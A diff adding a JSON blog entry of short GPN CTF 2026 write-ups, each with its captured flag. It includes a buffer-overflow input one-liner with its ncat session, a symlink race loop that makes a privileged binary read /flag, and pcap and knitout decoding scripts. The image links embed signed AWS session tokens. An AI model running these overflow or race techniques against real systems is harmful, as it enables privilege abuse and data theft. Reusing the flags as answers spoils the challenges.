@@ -1,0 +1,191 @@
+{
+  "id": "3763405d-7b65-801a-a190-ec88b6a30195",
+  "title": "GPN CTF 2026restaurant-builder",
+  "slug": "3763405d-7b65-801a-a190-ec88b6a30195",
+  "type": "Vulnerability Analysis",
+  "platform": "Local Lab",
+  "difficulty": "Medium",
+  "tags": [],
+  "published": true,
+  "featured": false,
+  "date": "2026-06-06",
+  "cover": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&q=80&w=1200",
+  "summary": "No summary provided for this security writeup.",
+  "blocks": [
+    {
+      "type": "heading_1",
+      "content": "restaurant-builder "
+    },
+    {
+      "type": "paragraph",
+      "content": "Introduction\nWeb"
+    },
+    {
+      "type": "paragraph",
+      "content": "https://poached-gnocchi-wrapped-in-emulsified-beans-adve.gpn24.ctf.kitctf.de\n\n"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/1b1ce7fe-2961-4514-ac5f-9b9f5af61d91/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WDVAEWJI%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T102429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF4gUSqsme5EHxNkXjYF59kSkONDmmjWezv3zvd3aL5bAiEAjoKauB4BE9LJhphF4k0vT9sCM9%2BBTRXvLNpmFd%2Bj8QYqiAQIsv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDB6hqaAH8AIw%2BL35mSrcA5xWdTnT7ZFi%2FYqbUKMvyUkaEE9iSbWSbZFCzjM38UqQ3UPTBt6WaGS55xKm3yXUcZKft1krjwLg1PKZN%2FWWChgmqMmzE%2FXjXn1gPmBmMQa69TRDqwLNNWgSARKaiDFZ8xPUqSn85JyOvfdfkXci89zHPT54j9s7kQwjeRr2szS3uo7dauDEVtrNegF2cSmxLNAX6%2B19ex3vQh7veuwJk463WVSuZVmEW5GjwOXG93jHoTxSDGcd%2FrwFBoH7Bioo59E4I8iLmA3s2cLFdeI7WL004W6Z0hUEANQgB0VzyXULvFfxc1FXxlLsXRlQKiU8DppvPG1KBfvXVlHpZLRCQKyt%2BnsaZPfyk4w5RK%2FTI7hfGN1Af5rlLY3ZKsuvenMB%2BbLAQLBRdCA51P0jtzZMxYyC2Lel0xWQc%2FqVJ6ihtza90SHK%2B28rLl7ep7uGVRSE%2BiZSsE3IH%2BnKCv9ZjvQoyFgK6OUOSXkFvSxTXQ5KBydtVSE9hzG2391J0fOTAeZbC8pcSvk4mjR59vywsXxHM3vvcn2Z6h7UCO4BPJsfP%2BpHg9pjN7ik33tPCIRrNuQjJD6HX5St%2B2aX1cbwJg1KkhWfjLOWu1zTDzIMnHw92cPAMRhvON7gES4SNCCAMPaUmtEGOqUBl2wypemE7zOIHfQlvZkbH5ON6RewsfC1sjTKPeaaGLe72eLlOHm7ft1S1PmuwRmuLXnYXWsLpamNDn%2F5w2H5aRHYAw5BXxLlzXCEfygezxylzxjCcJSWSo2pgSiGKadTPc1VNIiQCH45UE4htFXms5Jpao5NnJoU%2B%2FEP6GRHdJ1bcAEtV5gyiSgjONFofbw1B1%2BAVX4Ox%2B3JEYYaXguSFCLYya93&X-Amz-Signature=eb949240731684153752c17729181af7e41b101bc13d300b7cd961db7e93d76c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/08762003-ac09-484a-8afb-9c611019cef0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WDVAEWJI%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T102429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF4gUSqsme5EHxNkXjYF59kSkONDmmjWezv3zvd3aL5bAiEAjoKauB4BE9LJhphF4k0vT9sCM9%2BBTRXvLNpmFd%2Bj8QYqiAQIsv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDB6hqaAH8AIw%2BL35mSrcA5xWdTnT7ZFi%2FYqbUKMvyUkaEE9iSbWSbZFCzjM38UqQ3UPTBt6WaGS55xKm3yXUcZKft1krjwLg1PKZN%2FWWChgmqMmzE%2FXjXn1gPmBmMQa69TRDqwLNNWgSARKaiDFZ8xPUqSn85JyOvfdfkXci89zHPT54j9s7kQwjeRr2szS3uo7dauDEVtrNegF2cSmxLNAX6%2B19ex3vQh7veuwJk463WVSuZVmEW5GjwOXG93jHoTxSDGcd%2FrwFBoH7Bioo59E4I8iLmA3s2cLFdeI7WL004W6Z0hUEANQgB0VzyXULvFfxc1FXxlLsXRlQKiU8DppvPG1KBfvXVlHpZLRCQKyt%2BnsaZPfyk4w5RK%2FTI7hfGN1Af5rlLY3ZKsuvenMB%2BbLAQLBRdCA51P0jtzZMxYyC2Lel0xWQc%2FqVJ6ihtza90SHK%2B28rLl7ep7uGVRSE%2BiZSsE3IH%2BnKCv9ZjvQoyFgK6OUOSXkFvSxTXQ5KBydtVSE9hzG2391J0fOTAeZbC8pcSvk4mjR59vywsXxHM3vvcn2Z6h7UCO4BPJsfP%2BpHg9pjN7ik33tPCIRrNuQjJD6HX5St%2B2aX1cbwJg1KkhWfjLOWu1zTDzIMnHw92cPAMRhvON7gES4SNCCAMPaUmtEGOqUBl2wypemE7zOIHfQlvZkbH5ON6RewsfC1sjTKPeaaGLe72eLlOHm7ft1S1PmuwRmuLXnYXWsLpamNDn%2F5w2H5aRHYAw5BXxLlzXCEfygezxylzxjCcJSWSo2pgSiGKadTPc1VNIiQCH45UE4htFXms5Jpao5NnJoU%2B%2FEP6GRHdJ1bcAEtV5gyiSgjONFofbw1B1%2BAVX4Ox%2B3JEYYaXguSFCLYya93&X-Amz-Signature=58601dd8a3895522f80bf3e20cedd8eb46fe731e68412346e68fc08ebe306d14&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/42c4917b-2e61-42dd-973e-c1f8de6eeeec/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WDVAEWJI%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T102429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF4gUSqsme5EHxNkXjYF59kSkONDmmjWezv3zvd3aL5bAiEAjoKauB4BE9LJhphF4k0vT9sCM9%2BBTRXvLNpmFd%2Bj8QYqiAQIsv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDB6hqaAH8AIw%2BL35mSrcA5xWdTnT7ZFi%2FYqbUKMvyUkaEE9iSbWSbZFCzjM38UqQ3UPTBt6WaGS55xKm3yXUcZKft1krjwLg1PKZN%2FWWChgmqMmzE%2FXjXn1gPmBmMQa69TRDqwLNNWgSARKaiDFZ8xPUqSn85JyOvfdfkXci89zHPT54j9s7kQwjeRr2szS3uo7dauDEVtrNegF2cSmxLNAX6%2B19ex3vQh7veuwJk463WVSuZVmEW5GjwOXG93jHoTxSDGcd%2FrwFBoH7Bioo59E4I8iLmA3s2cLFdeI7WL004W6Z0hUEANQgB0VzyXULvFfxc1FXxlLsXRlQKiU8DppvPG1KBfvXVlHpZLRCQKyt%2BnsaZPfyk4w5RK%2FTI7hfGN1Af5rlLY3ZKsuvenMB%2BbLAQLBRdCA51P0jtzZMxYyC2Lel0xWQc%2FqVJ6ihtza90SHK%2B28rLl7ep7uGVRSE%2BiZSsE3IH%2BnKCv9ZjvQoyFgK6OUOSXkFvSxTXQ5KBydtVSE9hzG2391J0fOTAeZbC8pcSvk4mjR59vywsXxHM3vvcn2Z6h7UCO4BPJsfP%2BpHg9pjN7ik33tPCIRrNuQjJD6HX5St%2B2aX1cbwJg1KkhWfjLOWu1zTDzIMnHw92cPAMRhvON7gES4SNCCAMPaUmtEGOqUBl2wypemE7zOIHfQlvZkbH5ON6RewsfC1sjTKPeaaGLe72eLlOHm7ft1S1PmuwRmuLXnYXWsLpamNDn%2F5w2H5aRHYAw5BXxLlzXCEfygezxylzxjCcJSWSo2pgSiGKadTPc1VNIiQCH45UE4htFXms5Jpao5NnJoU%2B%2FEP6GRHdJ1bcAEtV5gyiSgjONFofbw1B1%2BAVX4Ox%2B3JEYYaXguSFCLYya93&X-Amz-Signature=42388901b1bac7e96afa768128c4aae6b5e41c314c7124bd249f81cd880aea61&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "heading_1",
+      "content": "COMpetition"
+    },
+    {
+      "type": "paragraph",
+      "content": "IntroductionCrypto"
+    },
+    {
+      "type": "code",
+      "content": "",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag : "
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{WAit, it's NoT juST lUck? NeveR has 833n.}"
+    },
+    {
+      "type": "heading_1",
+      "content": "Auto Cooker "
+    },
+    {
+      "type": "paragraph",
+      "content": " Introduction Reversing"
+    },
+    {
+      "type": "paragraph",
+      "content": "I always feel like cooking is such a chore...\nYou have to chop up all your ingredients, cook them for hours and then make the plating look half-decent.But not with this new machine I got!\nYou just have to put in your recipe (weirdly, the interface calls it a flag...) and it will get cooked for you.\nIt's so easy, even someone with no experience in cooking reverse engineering can do it."
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag "
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{I_FEE1_LIkE_you_Are_readY_F0R_Our_haRDEsT_DIshEs_N0W}"
+    },
+    {
+      "type": "heading_1",
+      "content": "Recipe for Disaster"
+    },
+    {
+      "type": "paragraph",
+      "content": "Introduction Pwning"
+    },
+    {
+      "type": "code",
+      "content": "python3 -c 'import sys; sys.stdout.buffer.write(b\"1\\n\" + b\"A\"*32 + b\"\\xff\\xff\\xff\\xff\\n0\\n\")'\n1\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����\n0",
+      "language": "shell"
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/gpnctf]\n└─# ncat --ssl pan-seared-croissant-alongside-whipped-truffle-oil-atsf.gpn24.ctf.kitctf.de 443\n═══════════════════════════════════════════\n        GPNCTF Food Ordering System        \n     Great Prices. No Vulnerabilities.     \n═══════════════════════════════════════════\n\nYou may order up to 10 items. Enter 0 when done.\n\n\n┌────────────────────────────────────────┐\n│              TODAY'S MENU              │\n├───┬─────────────────────────────┬──────┤\n│ # │ Item                        │    $ │\n├───┼─────────────────────────────┼──────┤\n│ 1 │ Overwritten Return Pointer  │ 1337 │\n│ 2 │ Gulasch                     │   23 │\n│ 3 │ Deep Fried XSS              │   13 │\n│ 4 │ Pizza Crypto                │   11 │\n│ 5 │ Scrambled VM Instruction    │   18 │\n│ 6 │ Grilled Bits                │    6 │\n└───┴─────────────────────────────┴──────┘\n\nSelect item (1-6), or 0 to finish: 1\nAny note for the chef? (leave blank for none)\n> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����\n\nAdded: Overwritten Return Pointer ($-272777233)\n\n┌────────────────────────────────────────┐\n│              TODAY'S MENU              │\n├───┬─────────────────────────────┬──────┤\n│ # │ Item                        │    $ │\n├───┼─────────────────────────────┼──────┤\n│ 1 │ Overwritten Return Pointer  │ 1337 │\n│ 2 │ Gulasch                     │   23 │\n│ 3 │ Deep Fried XSS              │   13 │\n│ 4 │ Pizza Crypto                │   11 │\n│ 5 │ Scrambled VM Instruction    │   18 │\n│ 6 │ Grilled Bits                │    6 │\n└───┴─────────────────────────────┴──────┘\n\nSelect item (1-6), or 0 to finish: 0\n\n========== YOUR RECEIPT ==========\n  Overwritten Return Pointer $-272777233\n    (note: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)\n----------------------------------\n  TOTAL                      $-272777233\n==================================\n\n[SYSTEM] Pricing error detected! We sincerely apologise for\n[SYSTEM] the inconvenience. Please accept this coupon:\n\nGPNCTF{WAIt, wiTH th3S3 PrICeS, OV3rFLows SHou1d nOT BE P05sible...}\n",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag "
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{WAIt, wiTH th3S3 PrICeS, OV3rFLows SHou1d nOT BE P05sible...}"
+    },
+    {
+      "type": "heading_1",
+      "content": "Double Fried"
+    },
+    {
+      "type": "paragraph",
+      "content": "Introduction Miscellaneous"
+    },
+    {
+      "type": "code",
+      "content": "┌──(root㉿kali)-[/home/kali/Desktop/gpnctf/double-fried]\n└─# tshark -r kitchen_log.pcap -T fields -e syslog.msgid -e syslog.msg \\\n| sort -n \\\n| awk -F'\\t' '{printf \"%s\",$2}'\n\necho\nRunning as user \"root\" and group \"root\". This could be dangerous.\nBeepN0t  4lm0st but n0t qu1t3. H1nt: 1t 15 m3 :)BoopKITchen ready!Awaiting ordersGot order for a loaded binaryOrder delivered!WARNING: Sous chef injuredOrder for some fries receivedSent out friesReceived fries backYou're completely right! I'm sorry, I should not have added that sous chef's finger to the fries. I'll retryFryer oil exploded. yay...Fries sent out againNoticed weird beepingReceived an order for a very delicious flag :)For security I'll send out the flag char by charHave fun with itGPNCTF{N1CE, you F0Und 0u7 Wh0 diD N07 8E1on6 Th3re}You now have received your flagI hope it tastes good.",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag"
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{N1CE, you F0Und 0u7 Wh0 diD N07 8E1on6 Th3re}\n"
+    },
+    {
+      "type": "heading_1",
+      "content": "Knitted Flag"
+    },
+    {
+      "type": "paragraph",
+      "content": "Miscellaneous"
+    },
+    {
+      "type": "code",
+      "content": "#!/usr/bin/env python3\n\nfrom PIL import Image\nimport re\n\nKNITOUT_FILE = \"pattern.k\"\nWIDTH = 20\n\nfront = set(range(1, WIDTH + 1))\nback = set()\n\nbitmap = []\n\nlast_dir = None\nrow_started = False\n\nwith open(KNITOUT_FILE, \"r\") as f:\n    for line in f:\n        line = line.strip()\n\n        if not line or line.startswith(\";\"):\n            continue\n\n        # Handle transfers\n        if line.startswith(\"xfer\"):\n            _, src, dst = line.split()\n\n            sbed = src[0]\n            snum = int(src[1:])\n\n            dbed = dst[0]\n            dnum = int(dst[1:])\n\n            if sbed == \"f\" and dbed == \"b\":\n                front.discard(snum)\n                back.add(dnum)\n\n            elif sbed == \"b\" and dbed == \"f\":\n                back.discard(snum)\n                front.add(dnum)\n\n        # Track carriage passes\n        elif line.startswith(\"knit\"):\n            parts = line.split()\n\n            direction = parts[1]\n\n            if last_dir is None:\n                last_dir = direction\n\n            elif direction != last_dir:\n                # Carriage changed direction -> snapshot bed state\n                bitmap.append(\n                    [1 if n in back else 0 for n in range(1, WIDTH + 1)]\n                )\n\n                last_dir = direction\n\n# Add final state\nbitmap.append(\n    [1 if n in back else 0 for n in range(1, WIDTH + 1)]\n)\n\nheight = len(bitmap)\nwidth = WIDTH\n\nprint(f\"[+] Generated bitmap: {width}x{height}\")\n\nimg = Image.new(\"L\", (width, height))\n\nfor y, row in enumerate(bitmap):\n    for x, pixel in enumerate(row):\n        img.putpixel((x, y), 255 if pixel else 0)\n\n# Save original\nimg.save(\"original.png\")\n\n# Common CTF orientations\nvariants = {\n    \"rot90.png\": img.rotate(90, expand=True),\n    \"rot180.png\": img.rotate(180, expand=True),\n    \"rot270.png\": img.rotate(270, expand=True),\n    \"flip_h.png\": img.transpose(Image.FLIP_LEFT_RIGHT),\n    \"flip_v.png\": img.transpose(Image.FLIP_TOP_BOTTOM),\n}\n\nfor name, variant in variants.items():\n    variant.save(name)\n\n# Large preview versions\nfor name, variant in variants.items():\n    variant.resize(\n        (variant.width * 8, variant.height * 8),\n        Image.NEAREST\n    ).save(\"large_\" + name)\n\nimg.resize(\n    (img.width * 8, img.height * 8),\n    Image.NEAREST\n).save(\"large_original.png\")\n\nprint(\"[+] Saved:\")\nprint(\"    original.png\")\nprint(\"    rot90.png\")\nprint(\"    rot180.png\")\nprint(\"    rot270.png\")\nprint(\"    flip_h.png\")\nprint(\"    flip_v.png\")\nprint(\"    large_* versions\")",
+      "language": "shell"
+    },
+    {
+      "type": "image",
+      "content": "https://prod-files-secure.s3.us-west-2.amazonaws.com/7a19a792-95ed-444b-9a77-2b1a0193aa5e/51a6b3a0-8fd5-47cd-a24a-ee27ece213de/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466WDVAEWJI%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T102429Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF4gUSqsme5EHxNkXjYF59kSkONDmmjWezv3zvd3aL5bAiEAjoKauB4BE9LJhphF4k0vT9sCM9%2BBTRXvLNpmFd%2Bj8QYqiAQIsv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDB6hqaAH8AIw%2BL35mSrcA5xWdTnT7ZFi%2FYqbUKMvyUkaEE9iSbWSbZFCzjM38UqQ3UPTBt6WaGS55xKm3yXUcZKft1krjwLg1PKZN%2FWWChgmqMmzE%2FXjXn1gPmBmMQa69TRDqwLNNWgSARKaiDFZ8xPUqSn85JyOvfdfkXci89zHPT54j9s7kQwjeRr2szS3uo7dauDEVtrNegF2cSmxLNAX6%2B19ex3vQh7veuwJk463WVSuZVmEW5GjwOXG93jHoTxSDGcd%2FrwFBoH7Bioo59E4I8iLmA3s2cLFdeI7WL004W6Z0hUEANQgB0VzyXULvFfxc1FXxlLsXRlQKiU8DppvPG1KBfvXVlHpZLRCQKyt%2BnsaZPfyk4w5RK%2FTI7hfGN1Af5rlLY3ZKsuvenMB%2BbLAQLBRdCA51P0jtzZMxYyC2Lel0xWQc%2FqVJ6ihtza90SHK%2B28rLl7ep7uGVRSE%2BiZSsE3IH%2BnKCv9ZjvQoyFgK6OUOSXkFvSxTXQ5KBydtVSE9hzG2391J0fOTAeZbC8pcSvk4mjR59vywsXxHM3vvcn2Z6h7UCO4BPJsfP%2BpHg9pjN7ik33tPCIRrNuQjJD6HX5St%2B2aX1cbwJg1KkhWfjLOWu1zTDzIMnHw92cPAMRhvON7gES4SNCCAMPaUmtEGOqUBl2wypemE7zOIHfQlvZkbH5ON6RewsfC1sjTKPeaaGLe72eLlOHm7ft1S1PmuwRmuLXnYXWsLpamNDn%2F5w2H5aRHYAw5BXxLlzXCEfygezxylzxjCcJSWSo2pgSiGKadTPc1VNIiQCH45UE4htFXms5Jpao5NnJoU%2B%2FEP6GRHdJ1bcAEtV5gyiSgjONFofbw1B1%2BAVX4Ox%2B3JEYYaXguSFCLYya93&X-Amz-Signature=644b5cef24365a804c629de120819da30dc353ac6011ecff0b5fa6050f6da898&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+      "caption": ""
+    },
+    {
+      "type": "code",
+      "content": "tesseract large_rot90.png stdout",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag "
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{conGR47ULAT1oN5_yOu_haV3_UNderSto0D_KNiTOut_AND_UNravEleD_7HE_74bLEclOths}"
+    },
+    {
+      "type": "heading_1",
+      "content": "Easy DSA"
+    },
+    {
+      "type": "paragraph",
+      "content": "Crypto"
+    },
+    {
+      "type": "heading_1",
+      "content": "superCAT"
+    },
+    {
+      "type": "paragraph",
+      "content": "Miscellaneous"
+    },
+    {
+      "type": "code",
+      "content": "mkdir -p /home/ctf/testdir && echo owned > /home/ctf/testdir/a && ln -sf /home/ctf/testdir/a /home/ctf/testdir/link && (while true; do ln -sf /home/ctf/testdir/a /home/ctf/testdir/link; ln -sf /flag /home/ctf/testdir/link; done) & while true; do /usr/local/bin/supercat /home/ctf/testdir/link 2>/dev/null; done",
+      "language": "shell"
+    },
+    {
+      "type": "heading_2",
+      "content": "Flag"
+    },
+    {
+      "type": "paragraph",
+      "content": "GPNCTF{ruS7_I5_sh1t_ch4n6e_My_MiND}"
+    }
+  ]
+}
